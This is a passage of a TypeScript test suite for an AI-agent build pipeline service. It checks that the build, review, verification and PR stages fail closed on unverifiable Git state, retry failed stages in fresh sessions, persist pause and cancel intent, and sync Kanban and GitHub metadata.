  test("fails and retries the review before dispatch when its worktree probe fails", async () => {
    await withService(async (service, storage, provider, _invocations, controls) => {
      const { started } = await startBuilding(service, storage);
      const dispatched = provider.sent.length;
      controls.failCommands.add("get_environment_uncommitted_paths");

      await service.advanceNow(started.id);

      // A state the backend cannot establish can never be certified, so the
      // stage fails here rather than after burning an agent turn on it.
      const failed = await pipeline(storage, started.id);
      expect(failed).toMatchObject({
        phase: "failed",
        error:
          "Review cannot start because the backend could not establish the environment Git state: probe failed (Error)",
        failureContext: {
          phase: "reviewing",
          kind: "stage-transition",
        },
      });
      expect(failed.sessions).toEqual([
        expect.objectContaining({ phase: "build", status: "idle" }),
      ]);
      expect(provider.sent.length).toBe(dispatched);

      controls.failCommands.delete("get_environment_uncommitted_paths");
      const retried = await service.retryStage(started.id);
      expect(retried).toMatchObject({
        phase: "reviewing",
        currentSessionIndex: 1,
        sessions: [
          expect.objectContaining({ phase: "build", status: "idle" }),
          expect.objectContaining({ phase: "review", status: "running" }),
        ],
      });
    });
  });

  test("retries a transient worktree probe failure instead of failing the stage", async () => {
    await withService(async (service, storage, _provider, _invocations, controls) => {
      const { started } = await startBuilding(service, storage);
      // One lost exec must not decide a stage the pipeline cannot recover.
      controls.failCommandsOnce.set("get_environment_uncommitted_paths", 1);

      await service.advanceNow(started.id);

      const reviewing = await pipeline(storage, started.id);
      expect(reviewing.phase).toBe("reviewing");
      expect(reviewing.sessions.at(-1)).toMatchObject({
        validationHeadAtStart: controls.currentHead,
        validationWorktreeStatusAtStart: "clean",
      });

      controls.failCommandsOnce.set("get_environment_uncommitted_paths", 2);
      await service.advanceNow(started.id);

      expect((await pipeline(storage, started.id)).phase).toBe("verifying");
    });
  });

  test("fails closed when review validation leaves an uncommitted input", async () => {
    await withService(async (service, storage, _provider, _invocations, controls) => {
      const { started } = await startBuilding(service, storage);
      await service.advanceNow(started.id);
      const reviewing = await pipeline(storage, started.id);
      expect(reviewing.phase).toBe("reviewing");
      expect(reviewing.sessions.at(-1)).toMatchObject({
        validationHeadAtStart: controls.currentHead,
        validationWorktreeStatusAtStart: "clean",
        validationUncommittedPathsAtStart: [],
      });

      controls.uncommittedPaths = ["src/generated.ts"];
      await service.advanceNow(started.id);

      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "failed",
        error: "Review cannot be certified because validation left 1 uncommitted path that was not there when it started",
      });
    });
  });

  // A snapshot written before the path list existed still has to certify. The
  // "clean" status pins the baseline to the empty set on its own.
  test("certifies a legacy baseline that recorded a clean status without paths", async () => {
    await withService(async (service, storage) => {
      const verifying = await startVerifying(service, storage);
      await mutateStored(storage, verifying.id, (snapshot) => {
        delete snapshot.sessions[snapshot.currentSessionIndex]!
          .validationUncommittedPathsAtStart;
      });

      await service.advanceNow(verifying.id);

      expect((await pipeline(storage, verifying.id)).phase).toBe("creating-pr");
    });
  });

  // A legacy "dirty" baseline has no path set to compare against, and guessing
  // one would either wave through an edit or reject a leftover. Fail instead.
  test("refuses to certify a legacy dirty baseline that recorded no paths", async () => {
    await withService(async (service, storage, _provider, _invocations, controls) => {
      controls.uncommittedPaths = ["src/forgotten.ts"];
      const verifying = await startVerifying(service, storage);
      expect(
        verifying.sessions[verifying.currentSessionIndex]!.validationWorktreeStatusAtStart,
      ).toBe("dirty");
      await mutateStored(storage, verifying.id, (snapshot) => {
        delete snapshot.sessions[snapshot.currentSessionIndex]!
          .validationUncommittedPathsAtStart;
      });

      await service.advanceNow(verifying.id);

      expect(await pipeline(storage, verifying.id)).toMatchObject({
        phase: "failed",
        error: "Verification cannot be certified because its starting Git state was not recorded",
      });
    });
  });

  // Addressing and verification each open fresh sessions. Anything the address
  // stage leaves uncommitted is the verification session's new baseline, not a
  // violation of it.
  test("rebaselines verification against what the addressing turn left behind", async () => {
    await withService(async (service, storage, provider, _invocations, controls) => {
      provider.structured = async <T>() => ({
        ok: true,
        value: {
          ...cleanReview,
          issues: [{
            severity: "P1",
            confidence: 90,
            category: "correctness",
            title: "Address this exact finding",
            file: "src/app.ts",
            line: 12,
            symbol: "run",
            description: "The result is wrong.",
            evidence: "The boundary test fails.",
            suggestion: "Correct the boundary.",
            verification: "Run the boundary test.",
          }],
          verdict: { ready: "with-fixes", reasoning: "One fix is required." },
        },
      }) as StructuredOutputResult<T>;
      const { started } = await startBuilding(service, storage);
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);
      expect((await pipeline(storage, started.id)).phase).toBe("addressing");

      // The addressing turn commits its fixes and leaves a scratch file.
      controls.currentHead = "3333333333333333333333333333333333333333";
      controls.uncommittedPaths = ["notes/scratch.md"];
      await service.advanceNow(started.id);

      const verifying = await pipeline(storage, started.id);
      expect(verifying.phase).toBe("verifying");
      expect(verifying.sessions.at(-1)).toMatchObject({
        phase: "verify",
        validationHeadAtStart: "3333333333333333333333333333333333333333",
        validationWorktreeStatusAtStart: "dirty",
        validationUncommittedPathsAtStart: ["notes/scratch.md"],
      });
    });
  });

  test("fails closed when verification validation commits a change", async () => {
    await withService(async (service, storage, _provider, _invocations, controls) => {
      const verifying = await startVerifying(service, storage);
      const session = verifying.sessions[verifying.currentSessionIndex]!;
      expect(session).toMatchObject({
        phase: "verify",
        validationHeadAtStart: controls.currentHead,
        validationWorktreeStatusAtStart: "clean",
      });

      controls.currentHead = "2222222222222222222222222222222222222222";
      await service.advanceNow(verifying.id);

      expect(await pipeline(storage, verifying.id)).toMatchObject({
        phase: "failed",
        error: "Verification cannot be certified because validation changed the environment HEAD",
      });
    });
  });

  test("fails closed when Git state cannot be verified after validation", async () => {
    await withService(async (service, storage, _provider, _invocations, controls) => {
      const { started } = await startBuilding(service, storage);
      await service.advanceNow(started.id);
      controls.failCommands.add("get_environment_uncommitted_paths");

      await service.advanceNow(started.id);

      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "failed",
        error:
          "Review cannot be certified because the backend could not verify Git state after validation: probe failed (Error)",
      });
    });
  });

  test("allows ignored validation output when Git state remains clean", async () => {
    await withService(async (service, storage, _provider, _invocations, controls) => {
      const verifying = await startVerifying(service, storage);

      // Ignored caches and build output never appear in the authoritative
      // porcelain response, so unchanged HEAD plus no paths is the safe case.
      controls.uncommittedPaths = [];
      await service.advanceNow(verifying.id);

      expect((await pipeline(storage, verifying.id)).phase).toBe("creating-pr");
    });
  });

  test("publishes running transcripts from the backend before a stage completes", async () => {
    await withService(async (service, storage, provider) => {
      provider.status = async () => "running";
      provider.messages = async (sessionId) => [{
        id: `${sessionId}-assistant`,
        role: "assistant",
        parts: [{ type: "text", content: "Implementing the backend runner" }],
      }];
      const started = await service.start({
        taskId: "task-live",
        projectId: "project-1",
        environmentType: "local",
        agentType: "claude",
        taskTitle: "Live transcript",
        taskSnapshot: {
          title: "Live transcript",
          description: "",
          acceptanceCriteria: "",
          comments: [],
          images: [],
        },
        existingEnvironmentId: "env-1",
      });

      await service.advanceNow(started.id);
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);

      const running = await pipeline(storage, started.id);
      expect(running.phase).toBe("building");
      expect(running.sessions[0]).toMatchObject({
        status: "running",
        messageRevision: 1,
        messages: [expect.objectContaining({ role: "assistant" })],
      });
    });
  });

  test("durably links Kanban and feature-plan ownership before advancing", async () => {
    await withService(async (service, storage, _provider, invocations) => {
      const started = await service.start({
        taskId: "task-3",
        projectId: "project-1",
        environmentType: "local",
        agentType: "codex",
        taskTitle: "Feature pipeline",
        taskSnapshot: {
          title: "Feature pipeline",
          description: "",
          acceptanceCriteria: "",
          comments: [],
          images: [],
        },
        source: { type: "kanban", taskId: "task-3" },
        featurePlanId: "feature-1",
        existingEnvironmentId: "env-1",
      });

      expect(started.sourceLinkedAt).toBeString();
      expect(invocations).toContainEqual({
        command: "update_kanban_task",
        args: {
          taskId: "task-3",
          environmentId: "env-1",
          buildPipelineId: started.id,
        },
      });
      expect(invocations).toContainEqual({
        command: "update_feature_plan",
        args: {
          featureId: "feature-1",
          updates: {
            status: "building",
            buildTaskId: "task-3",
            buildPipelineId: started.id,
            codexEnvironmentId: "env-1",
          },
        },
      });
      expect((await pipeline(storage, started.id)).sourceLinkedAt).toBeString();
    });
  });

  test("recovers an environment created before the pipeline association was saved", async () => {
    const dataDir = await fs.mkdtemp(path.join(tmpdir(), "orkestrator-pipeline-recovery-"));
    const storage = new StorageService(dataDir);
    await storage.init();
    await storage.addEnvironment({
      id: "recovered-env",
      projectId: "project-1",
      buildPipelineId: "recovering-pipeline",
      name: "recovered",
      branch: "recovered",
      containerId: null,
      status: "stopped",
      prUrl: null,
      prState: null,
      hasMergeConflicts: null,
      createdAt: new Date(0).toISOString(),
      networkAccessMode: "full",
      order: 0,
      environmentType: "local",
      worktreePath: "/tmp/recovered",
    });
    const recovering: BuildPipeline = {
      id: "recovering-pipeline",
      taskId: "task-3",
      projectId: "project-1",
      environmentId: "",
      environmentType: "local",
      agentType: "claude",
      phase: "creating-environment",
      sessions: [],
      currentSessionIndex: -1,
      iteration: 0,
      maxIterations: 3,
      createdAt: new Date(0).toISOString(),
      taskTitle: "Recover pipeline",
      taskSnapshot: {
        title: "Recover pipeline",
        description: "",
        acceptanceCriteria: "",
        comments: [],
        images: [],
      },
      backendRevision: 0,
      controller: "backend",
    };
    await storage.saveBuildPipeline(
      recovering.id,
      recovering.projectId,
      "",
      2,
      recovering,
      0,
    );
    let createCalls = 0;
    const service = new BuildPipelineService(
      storage,
      async <T>(command: string): Promise<T> => {
        if (command === "create_environment") createCalls += 1;
        throw new Error(`Unexpected command: ${command}`);
      },
      {
        autoAdvance: false,
        provider: async () => new FakeProvider(),
      },
    );
    try {
      await service.advanceNow(recovering.id);
      expect(createCalls).toBe(0);
      expect(await pipeline(storage, recovering.id)).toMatchObject({
        environmentId: "recovered-env",
        environmentType: "local",
        phase: "starting-environment",
      });
    } finally {
      await service.shutdown();
      await fs.rm(dataDir, { recursive: true, force: true });
    }
  });

  test("rejects missing and cross-project existing environments before persisting", async () => {
    await withService(async (service, storage) => {
      await expect(service.start(startInput({
        existingEnvironmentId: "missing",
      }))).rejects.toThrow("does not belong to this project");
      await storage.addEnvironment({
        id: "foreign-env",
        projectId: "project-2",
        name: "foreign",
        branch: "foreign",
        containerId: null,
        status: "running",
        prUrl: null,
        prState: null,
        hasMergeConflicts: null,
        createdAt: new Date(0).toISOString(),
        networkAccessMode: "full",
        order: 0,
        environmentType: "local",
        worktreePath: "/tmp/foreign",
      });
      await expect(service.start(startInput({
        existingEnvironmentId: "foreign-env",
      }))).rejects.toThrow("does not belong to this project");
      expect(await storage.listBuildPipelines("project-1")).toEqual([]);
    });
  });

  test("resume dispatches durable continuation work instead of advancing an aborted stage", async () => {
    await withService(async (service, storage, provider) => {
      const started = await service.start(startInput());
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);
      expect(provider.sent).toHaveLength(1);

      await service.pause(started.id);
      expect((await pipeline(storage, started.id)).sessions[0]?.status).toBe("idle");
      await service.resume(started.id);
      await service.advanceNow(started.id);

      const resumed = await pipeline(storage, started.id);
      expect(resumed.phase).toBe("building");
      expect(resumed.sessions[0]?.status).toBe("running");
      expect(provider.sent).toHaveLength(2);
      expect(resumed.pendingPromptAttempt).toBeUndefined();
    });
  });

  test("persists pause and cancel intent even when abort cannot be confirmed", async () => {
    await withService(async (service, storage, provider) => {
      const started = await service.start(startInput());
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);
      provider.abort = async () => {
        throw new Error("bridge disconnected");
      };

      await expect(service.pause(started.id)).rejects.toThrow("bridge disconnected");
      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "paused",
        error: expect.stringContaining("could not be confirmed"),
      });

      await service.resume(started.id);
      await expect(service.cancel(started.id)).rejects.toThrow("bridge disconnected");
      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "failed",
        error: expect.stringContaining("could not be confirmed"),
      });
    });
  });

  test("does not complete until PR detection returns an authoritative result", async () => {
    await withService(async (service, storage, _provider, invocations, controls) => {
      controls.detection = null;
      const started = await service.start(startInput());
      for (let pass = 0; pass < 6; pass += 1) {
        await service.advanceNow(started.id);
      }
      expect((await pipeline(storage, started.id)).phase).toBe("creating-pr");
      expect(invocations).toContainEqual({
        command: "pr_monitor_watch",
        args: { environmentId: "env-1", mode: "create-pending" },
      });

      controls.detection = {
        url: "https://github.com/acme/repo/pull/42",
        state: "open",
        hasMergeConflicts: false,
      };
      await service.advanceNow(started.id);
      expect((await pipeline(storage, started.id)).phase).toBe("complete");
      expect(await storage.getEnvironment("env-1")).toMatchObject({
        prUrl: "https://github.com/acme/repo/pull/42",
        prState: "open",
        hasMergeConflicts: false,
      });
    });
  });

  test("completes PR creation when GitHub mergeability is still indeterminate", async () => {
    await withService(async (service, storage, _provider, invocations, controls) => {
      controls.detection = {
        url: "https://github.com/acme/repo/pull/43",
        state: "open",
        hasMergeConflicts: null,
      };
      const started = await service.start(startInput());
      for (let pass = 0; pass < 6; pass += 1) {
        await service.advanceNow(started.id);
      }

      expect((await pipeline(storage, started.id)).phase).toBe("complete");
      expect(await storage.getEnvironment("env-1")).toMatchObject({
        prUrl: "https://github.com/acme/repo/pull/43",
        prState: "open",
        hasMergeConflicts: null,
      });
      expect(invocations).toContainEqual({
        command: "pr_monitor_watch",
        args: { environmentId: "env-1", mode: "normal" },
      });
    });
  });

  test("uses container PR detection for containerized build environments", async () => {
    await withService(async (service, storage, _provider, invocations) => {
      await storage.updateEnvironment("env-1", {
        environmentType: "containerized",
        containerId: "container-1",
      });
      const started = await service.start(startInput({
        environmentType: "containerized",
      }));
      for (let pass = 0; pass < 6; pass += 1) {
        await service.advanceNow(started.id);
      }

      expect((await pipeline(storage, started.id)).phase).toBe("complete");
      expect(invocations).toContainEqual({
        command: "detect_pr",
        args: { containerId: "container-1", branch: "build" },
      });
      expect(invocations.some(({ command }) => command === "detect_pr_local"))
        .toBe(false);
    });
  });

  test("fails when a containerized build has no container for PR detection", async () => {
    await withService(async (service, storage) => {
      await storage.updateEnvironment("env-1", {
        environmentType: "containerized",
        containerId: null,
      });
      const started = await service.start(startInput({
        environmentType: "containerized",
      }));
      for (let pass = 0; pass < 6; pass += 1) {
        await service.advanceNow(started.id);
      }

      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "failed",
        error: "Build container is unavailable",
      });
    });
  });

  test("rejects malformed pull request detection results", async () => {
    await withService(async (service, storage, _provider, _invocations, controls) => {
      controls.detection = {
        url: "",
        state: "unknown",
        hasMergeConflicts: "yes",
      } as unknown as typeof controls.detection;
      const started = await service.start(startInput());
      for (let pass = 0; pass < 6; pass += 1) {
        await service.advanceNow(started.id);
      }

      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "failed",
        error: "Pull request detection returned an invalid result",
      });
    });
  });

  test("restores Kanban lifecycle transitions, comments, and PR metadata idempotently", async () => {
    await withService(async (service, storage, _provider, _invocations, controls) => {
      const started = await service.start(startInput({
        taskId: "task-kanban",
        source: { type: "kanban", taskId: "task-kanban" },
      }));
      for (let pass = 0; pass < 6; pass += 1) {
        await service.advanceNow(started.id);
      }
      const task = controls.kanbanTasks.get("task-kanban");
      expect((await pipeline(storage, started.id)).phase).toBe("complete");
      expect(task).toMatchObject({
        status: "review",
        prUrl: "https://github.com/acme/repo/pull/1",
        prState: "open",
      });
      expect(task?.comments.map((comment) => comment.text)).toEqual([
        "🔨 Build started",
        "✅ Validation complete",
        "🔗 PR raised: https://github.com/acme/repo/pull/1",
      ]);
      await service.advanceNow(started.id);
      expect(task?.comments).toHaveLength(3);
    });
  });

  test("persists terminal comment failures and retries the idempotent command", async () => {
    await withService(async (service, storage, _provider, invocations, controls) => {
      controls.failCommands.add("post_github_completion_comment");
      const started = await service.start(startInput({
        source: {
          type: "github",
          repositoryOwner: "acme",
          repositoryName: "repo",
          issueNumber: 7,
          issueUrl: "https://github.com/acme/repo/issues/7",
          status: "open",
        },
      }));
      for (let pass = 0; pass < 6; pass += 1) {
        await service.advanceNow(started.id);
      }
      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "complete",
        completionCommentStatus: "failed",
        completionCommentError: "post_github_completion_comment failed",
      });

      await expect(service.retryCompletionComment(started.id)).rejects.toThrow(
        "post_github_completion_comment failed",
      );
      expect(await pipeline(storage, started.id)).toMatchObject({
        completionCommentStatus: "failed",
        completionCommentError: "post_github_completion_comment failed",
      });

      controls.failCommands.delete("post_github_completion_comment");
      const retried = await service.retryCompletionComment(started.id);
      expect(retried).toMatchObject({
        completionCommentStatus: "posted",
        completionCommentId: "comment-1",
      });
      expect(invocations.filter((entry) =>
        entry.command === "post_github_completion_comment")).toHaveLength(3);
    });
  });

  test("imports only valid unowned legacy snapshots and never overwrites backend records", async () => {
    await withService(async (service, storage) => {
      const legacy = {
        ...startInput(),
        id: "legacy-pipeline",
        environmentId: "env-1",
        phase: "building",
        sessions: [],
        currentSessionIndex: -1,
        iteration: 0,
        maxIterations: 3,
        createdAt: new Date(0).toISOString(),
        backendRevision: 99,
      };
      delete (legacy as { existingEnvironmentId?: string }).existingEnvironmentId;
      delete (legacy as { namingPrompt?: string }).namingPrompt;

      const first = await service.importLegacy("project-1", [
        legacy,
        { id: "malformed" },
        { ...legacy, id: "foreign", projectId: "project-2" },
      ]);
      expect(first).toEqual({ importedIds: ["legacy-pipeline"], skipped: 2 });
      expect(await pipeline(storage, "legacy-pipeline")).toMatchObject({
        controller: "backend",
        backendRevision: 1,
      });
      const duplicate = await service.importLegacy("project-1", [legacy]);
      expect(duplicate).toEqual({ importedIds: [], skipped: 1 });

      expect(await service.importLegacy("", [legacy])).toEqual({
        importedIds: [],
        skipped: 1,
      });
      expect(await service.importLegacy(
        "project-1",
        null as unknown as unknown[],
      )).toEqual({ importedIds: [], skipped: 0 });

      expect(await service.importLegacy("project-1", [{
        ...legacy,
        id: "missing-environment",
        environmentId: "does-not-exist",
      }])).toEqual({ importedIds: [], skipped: 1 });

      await storage.addEnvironment({
        ...(await storage.getEnvironment("env-1"))!,
        id: "owned-env",
        name: "owned",
        branch: "owned",
        worktreePath: "/tmp/owned",
        buildPipelineId: "another-pipeline",
      });
      expect(await service.importLegacy("project-1", [{
        ...legacy,
        id: "owned-environment",
        environmentId: "owned-env",
      }])).toEqual({ importedIds: [], skipped: 1 });
    });
  });

  test("does not report or persist a legacy snapshot that collides with an active admission", async () => {
    await withService(async (service, storage) => {
      const active = await service.start(startInput({
        taskId: "admission-collision",
      }));
      const collidingId = "legacy-admission-collision";
      const collidingSnapshot: BuildPipeline = {
        ...active,
        id: collidingId,
        backendRevision: 0,
        controller: "backend",
      };

      const result = await service.importLegacy("project-1", [
        collidingSnapshot,
      ]);

      expect(result).toEqual({ importedIds: [], skipped: 1 });
      expect(await storage.getBuildPipeline(collidingId)).toBeNull();
      expect(await storage.getBuildPipeline(active.id)).toMatchObject({
        id: active.id,
        snapshot: expect.objectContaining({
          admissionKey: active.admissionKey,
          taskId: "admission-collision",
        }),
      });
      expect(await storage.listBuildPipelines("project-1")).toHaveLength(1);
    });
  });

  test("remove disposes a cached provider only after its final pipeline is gone", async () => {
    await withService(async (service, storage, provider) => {
      const first = await service.start(startInput({ taskId: "remove-first" }));
      const second = await service.start(startInput({ taskId: "remove-second" }));
      await service.cancel(first.id);
      await service.cancel(second.id);

      const dispose = mock(async () => {});
      (provider as FakeProvider & { dispose: () => Promise<void> }).dispose =
        dispose;
      const providers = (service as unknown as {
        providers: Map<string, BuildPipelineProvider>;
      }).providers;
      providers.set("env-1:claude", provider);

      await service.remove(first.id);
      expect(await storage.getBuildPipeline(first.id)).toBeNull();
      expect(dispose).not.toHaveBeenCalled();

      await service.remove(second.id);
      expect(await storage.getBuildPipeline(second.id)).toBeNull();
      expect(dispose).toHaveBeenCalledTimes(1);
      expect(providers.has("env-1:claude")).toBe(false);
    });
  });

  test("fails a local build cleanly when the project has no host checkout", async () => {
    const dataDir = await fs.mkdtemp(path.join(tmpdir(), "orkestrator-pipeline-no-checkout-"));
    const storage = new StorageService(dataDir);
    await storage.init();
    // What `create_environment` now answers for a remote-only project.
    const rejection = "Project has no local path - cannot create a local worktree";
    const invoke = async <T>(command: string): Promise<T> => {
      if (command !== "create_environment") {
        throw new Error(`Unexpected command: ${command}`);
      }
      throw new Error(rejection);
    };
    const service = new BuildPipelineService(storage, invoke, {
      autoAdvance: false,
      provider: async () => new FakeProvider(),
    });

    try {
      await expect(service.start(startInput({
        existingEnvironmentId: undefined,
        environmentType: "local",
      }))).rejects.toThrow(rejection);

      // The rejection must land as a terminal, explained failure rather than
      // leaving the pipeline parked in `creating-environment` forever.
      const pipelines = await storage.listBuildPipelines("project-1");
      expect(pipelines).toHaveLength(1);
      const pipeline = pipelines[0]!.snapshot as BuildPipeline;
      expect(pipeline.phase).toBe("failed");
      expect(pipeline.error).toContain(rejection);
      expect(pipeline.environmentId).toBeFalsy();
    } finally {
      await service.shutdown();
      await fs.rm(dataDir, { recursive: true, force: true });
    }
  });

  test("coalesces a timer-style provisioning race without losing the custom name prompt", async () => {
    const dataDir = await fs.mkdtemp(path.join(tmpdir(), "orkestrator-pipeline-race-"));
    const storage = new StorageService(dataDir);
    await storage.init();
    let service: BuildPipelineService;
    let createCalls = 0;
    let observedNamingPrompt: unknown;
    let buildPipelineEvents = 0;
    const invoke = async <T>(
      command: string,
      args: Record<string, unknown> = {},
    ): Promise<T> => {
      if (command !== "create_environment") {
        throw new Error(`Unexpected command: ${command}`);
      }
      createCalls += 1;
      observedNamingPrompt = args.namingPrompt;
      const environment = await storage.addEnvironment({
        id: "created-env",
        projectId: "project-1",
        buildPipelineId: String(args.buildPipelineId),
        name: "created",
        branch: "created",
        containerId: null,
        status: "stopped",
        prUrl: null,
        prState: null,
        hasMergeConflicts: null,
        createdAt: new Date(0).toISOString(),
        networkAccessMode: "full",
        order: 0,
        environmentType: "local",
        worktreePath: "/tmp/created",
      });
      return environment as T;
    };
    service = new BuildPipelineService(storage, invoke, {
      autoAdvance: false,
      provider: async () => new FakeProvider(),
    });
    storage.setResourceChangeListener((change) => {
      if (change.resource !== "build-pipeline") return;
      buildPipelineEvents += 1;
      if (buildPipelineEvents === 1) {
        void service.advanceNow(change.id);
      } else if (buildPipelineEvents === 2) {
        // The environment association is now visible, but the provisioning
        // pass has not necessarily released its lock. Model a timer callback
        // scheduled at precisely that boundary.
        queueMicrotask(() => {
          void service.advanceNow(change.id);
        });
      }
    });
    try {
      const started = await service.start(startInput({
        existingEnvironmentId: undefined,
        namingPrompt: "Use the customer's exact naming context",
      }));
      expect(started.environmentId).toBe("created-env");
      expect(started.sourceLinkedAt).toBeString();
      expect(started.phase).toBe("starting-environment");
      expect(createCalls).toBe(1);
      expect(observedNamingPrompt).toBe("Use the customer's exact naming context");
    } finally {
      await service.shutdown();
      await fs.rm(dataDir, { recursive: true, force: true });
    }
  });

  test("shutdown waits for an in-flight supervisor pass before disposing providers", async () => {
    await withService(async (service, _storage, provider) => {
      const started = await service.start(startInput());
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);

      let resolveStatus!: (status: ProviderStatus) => void;
      const statusResult = new Promise<ProviderStatus>((resolve) => {
        resolveStatus = resolve;
      });
      let statusStarted = false;
      provider.status = () => {
        statusStarted = true;
        return statusResult;
      };
      let shutdownFinished = false;
      const advance = service.advanceNow(started.id);
      while (!statusStarted) {
        await new Promise((resolve) => setTimeout(resolve, 0));
      }
      const shutdown = service.shutdown().then(() => {
        shutdownFinished = true;
      });
      await Promise.resolve();
      expect(shutdownFinished).toBe(false);
      resolveStatus("running");
      await advance;
      await shutdown;
      expect(shutdownFinished).toBe(true);
    });
  });

  test("coalesces overlapping timer ticks into one in-flight wrapper and one rerun", async () => {
    await withService(async (service, storage) => {
      const originalList = storage.listAllBuildPipelines.bind(storage);
      let releaseFirst!: () => void;
      const firstList = new Promise<void>((resolve) => {
        releaseFirst = resolve;
      });
      let listCalls = 0;
      storage.listAllBuildPipelines = async () => {
        listCalls += 1;
        if (listCalls === 1) await firstList;
        return originalList();
      };
      const scheduler = service as unknown as {
        requestTick: () => Promise<void>;
      };
      const first = scheduler.requestTick();
      const second = scheduler.requestTick();
      const third = scheduler.requestTick();
      expect(second).toBe(first);
      expect(third).toBe(first);
      expect(listCalls).toBe(1);
      releaseFirst();
      await first;
      expect(listCalls).toBe(2);
    });
  });

  for (const status of ["missing", "error"] as const) {
    test(`fails durably when provider status is ${status}`, async () => {
      await withService(async (service, storage, provider) => {
        const started = await service.start(startInput());
        await service.advanceNow(started.id);
        await service.advanceNow(started.id);
        provider.status = async () => status;
        await service.advanceNow(started.id);
        expect(await pipeline(storage, started.id)).toMatchObject({
          phase: "failed",
          error: expect.stringContaining(
            status === "missing" ? "no longer available" : "failed",
          ),
        });
      });
    });
  }

  test("persists the provider's session failure detail", async () => {
    await withService(async (service, storage, provider) => {
      const { started } = await startBuilding(service, storage);
      provider.status = async () => {
        throw new Error(
          "The codex session failed: stream disconnected before completion",
        );
      };

      await service.advanceNow(started.id);

      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "failed",
        error: "The codex session failed: stream disconnected before completion",
      });
    });
  });

  test("retries a failed build stage in a fresh session", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session: firstSession } = await startBuilding(
        service,
        storage,
      );
      provider.status = async () => "error";
      await service.advanceNow(started.id);

      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "failed",
        failureContext: {
          phase: "building",
          kind: "stage-transition",
          sessionId: firstSession.sdkSessionId,
        },
        sessions: [expect.objectContaining({
          sdkSessionId: firstSession.sdkSessionId,
          status: "error",
        })],
      });

      provider.status = async () => "idle";
      const retried = await service.retryStage(started.id);

      expect(retried).toMatchObject({
        phase: "building",
        currentSessionIndex: 1,
      });
      expect(retried.error).toBeUndefined();
      expect(retried.failureContext).toBeUndefined();
      expect(retried.stageRetryRequested).toBeUndefined();
      expect(retried.sessions).toHaveLength(2);
      expect(retried.sessions[0]).toMatchObject({
        sdkSessionId: firstSession.sdkSessionId,
        status: "error",
      });
      expect(retried.sessions[1]).toMatchObject({
        phase: "build",
        status: "running",
      });
      expect(retried.sessions[1]?.sdkSessionId)
        .not.toBe(firstSession.sdkSessionId);
      expect(provider.sent.at(-1)?.sessionId)
        .toBe(retried.sessions[1]?.sdkSessionId);
    });
  });

  test("persists a failed retry without reporting that a session restarted", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session: firstSession } = await startBuilding(
        service,
        storage,
      );
      provider.status = async () => "error";
      await service.advanceNow(started.id);
      provider.createSession = async () => {
        throw new Error("fresh session could not be created");
      };

      const retried = await service.retryStage(started.id);

      expect(retried).toMatchObject({
        phase: "failed",
        error: "fresh session could not be created",
      });
      expect(retried.stageRetryRequested).toBeUndefined();
      expect(retried.failureContext?.sessionId).toBeUndefined();
      expect(retried.sessions).toEqual([
        expect.objectContaining({
          sdkSessionId: firstSession.sdkSessionId,
          status: "error",
        }),
      ]);
    });
  });

  test("retries a failed provisioning phase without creating an agent session", async () => {
    await withService(async (service, storage, provider) => {
      const started = await service.start(startInput());
      expect(started.phase).toBe("starting-environment");
      await mutateStored(storage, started.id, (candidate) => {
        candidate.phase = "failed";
        candidate.error = "environment start failed";
        candidate.failureContext = {
          phase: "starting-environment",
          kind: "stage-transition",
        };
      });

      const retried = await service.retryStage(started.id);

      expect(retried).toMatchObject({
        phase: "waiting-for-setup",
        sessions: [],
        currentSessionIndex: -1,
      });
      expect(retried.error).toBeUndefined();
      expect(retried.failureContext).toBeUndefined();
      expect(retried.stageRetryRequested).toBeUndefined();
      expect(provider.created).toEqual([]);
    });
  });

  test("rejects failed-stage retry for cancellation and interaction failures", async () => {
    await withService(async (service, storage) => {
      const { started } = await startBuilding(service, storage);
      await service.cancel(started.id);
      await expect(service.retryStage(started.id)).rejects.toThrow(
        "no failed stage to retry",
      );

      await mutateStored(storage, started.id, (candidate) => {
        candidate.failureContext = {
          phase: "building",
          kind: "interactive-request",
          sessionId: candidate.sessions[0]!.sdkSessionId,
          requestId: "question-1",
        };
      });
      await expect(service.retryStage(started.id)).rejects.toThrow(
        "no failed stage to retry",
      );
    });
  });

  test("retries a failed PR stage in a fresh session", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session: firstSession } = await startBuilding(
        service,
        storage,
      );
      await mutateStored(storage, started.id, (candidate) => {
        candidate.phase = "failed";
        candidate.error = "The pr session failed";
        candidate.failureContext = {
          phase: "creating-pr",
          kind: "stage-transition",
          sessionId: firstSession.sdkSessionId,
        };
        candidate.sessions[candidate.currentSessionIndex]!.status = "error";
      });

      const retried = await service.retryStage(started.id);

      expect(retried).toMatchObject({
        phase: "creating-pr",
        currentSessionIndex: 1,
      });
      expect(retried.error).toBeUndefined();
      expect(retried.failureContext).toBeUndefined();
      expect(retried.stageRetryRequested).toBeUndefined();
      expect(retried.sessions).toHaveLength(2);
      expect(retried.sessions[0]).toMatchObject({
        sdkSessionId: firstSession.sdkSessionId,
        status: "error",
      });
      expect(retried.sessions[1]).toMatchObject({
        phase: "pr",
        status: "running",
      });
      expect(retried.sessions[1]?.sdkSessionId)
        .not.toBe(firstSession.sdkSessionId);
      expect(provider.created.at(-1)?.phase).toBe("pr");
      expect(provider.sent.at(-1)?.sessionId)
        .toBe(retried.sessions[1]?.sdkSessionId);
    });
  });

  test("retries a failed conflict-resolution stage in a fresh session", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session: firstSession } = await startBuilding(
        service,
        storage,
      );
      await mutateStored(storage, started.id, (candidate) => {
        candidate.phase = "failed";
        candidate.error = "The conflict resolution failed";
        candidate.failureContext = {
          phase: "resolving-conflicts",
          kind: "stage-transition",
          sessionId: firstSession.sdkSessionId,
        };
        candidate.sessions[candidate.currentSessionIndex]!.status = "error";
      });

